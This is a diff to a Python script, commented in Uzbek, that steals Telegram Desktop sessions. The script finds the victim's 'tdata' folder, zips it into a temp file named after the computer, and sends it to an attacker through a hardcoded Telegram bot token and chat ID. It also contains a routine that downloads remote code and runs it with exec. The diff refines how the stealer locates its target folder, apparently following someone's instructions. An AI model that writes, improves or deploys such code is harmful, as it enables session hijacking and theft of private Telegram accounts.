@@ -1,6 +1,6 @@
 import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
-# O'z-o'zini ishga tushirish (agar internetdan kelsa)
+# O'z-o'zini ishga tushirish
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -15,7 +15,7 @@ if os.name == 'nt':
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
-# requests ishlatmaydigan Telegram funksiyalar
+# Telegram yuborish funksiyalari
 def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -58,27 +58,22 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
-# --- BARCHA MUMKIN BO'LGAN YO'LLARNI QIDIRISH ---
-def find_tdata():
-    base_paths = [
-        os.getenv('APPDATA'),                 # C:\Users\...\AppData\Roaming
-        os.path.join(os.getenv('LOCALAPPDATA')), # C:\Users\...\AppData\Local
-        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming'), # Zaxira yo'l
-        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')    # Zaxira yo'l
-    ]
-    
-    for base in base_paths:
-        if base and os.path.exists(base):
-            path = os.path.join(base, 'TelegramDesktop', 'tdata')
-            if os.path.exists(path):
-                return path
-    return None
-
+# MAIN FUNKSIYA
 def main():
     pc_name = socket.gethostname()
-    tdata_path = find_tdata()
+    
+    # 1. Foydalanuvchi nomini olamiz
+    user_name = os.getenv('USERNAME')
+    
+    # 2. Aynan siz ko'rsatgan qattiq yo'lni tuzamiz
+    tdata_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Telegram Desktop\\tdata"
+    
+    # 3. Agar u yerda bo'lmasa, zaxira yo'lni tekshiramiz
+    if not os.path.exists(tdata_path):
+        tdata_path = os.path.join(os.getenv('APPDATA'), 'TelegramDesktop', 'tdata')
 
-    if tdata_path:
+    # 4. Endi tdata ni topish va siqish
+    if os.path.exists(tdata_path):
         try:
             temp_dir = tempfile.gettempdir()
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
